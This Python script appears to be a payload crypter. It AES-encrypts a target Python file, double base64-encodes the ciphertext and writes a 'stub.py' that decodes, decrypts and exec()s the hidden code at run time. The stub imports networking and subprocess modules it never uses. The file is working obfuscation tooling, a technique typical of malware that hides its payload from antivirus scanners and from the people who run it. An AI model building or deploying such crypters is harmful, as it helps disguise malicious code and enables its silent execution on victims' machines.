import base64
from utils import encrypt_file
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("file_path")
args = parser.parse_args()

TEMPLATE = """import base64
import requests
import time
import socket
import subprocess
import threading
from Crypto.Cipher import AES


def unpad(data):
    padding_length = data[-1]
    if padding_length < 1 or padding_length > 16:
        raise ValueError('Invalid padding encountered')
    return data[:-padding_length]


def decrypt_file(key, iv, input_bytes):
    try:
        decoded_key = bytes.fromhex(key)
        iv_bytes = bytes.fromhex(iv)
        if len(decoded_key) != 32:
            raise ValueError('Incorrect AES key length')
        cipher = AES.new(decoded_key, AES.MODE_CBC, iv_bytes)
        decrypted_data = unpad(cipher.decrypt(input_bytes))
        return decrypted_data
    except Exception as e:
        print(f'An error occurred during decryption: {e}')
        return None


if __name__ == '__main__':
    var = <x2encipher>
    key = '<key>'
    iv = '<iv>'
    var = base64.b64decode(var)
    var = base64.b64decode(var)
    od = decrypt_file(key, iv, bytes(var))
    exec(od)

"""

if __name__ == '__main__':
    key, iv, ciphertext = encrypt_file(args.file_path)
    encodedciphertext = base64.b64encode(ciphertext)
    x2encodedcipher = base64.b64encode(encodedciphertext)
    TEMPLATE = TEMPLATE.replace('<x2encipher>', str(x2encodedcipher))
    TEMPLATE = TEMPLATE.replace('<key>', key)
    TEMPLATE = TEMPLATE.replace('<iv>', iv)
    with open('stub.py', 'w') as f:
        f.write(TEMPLATE)
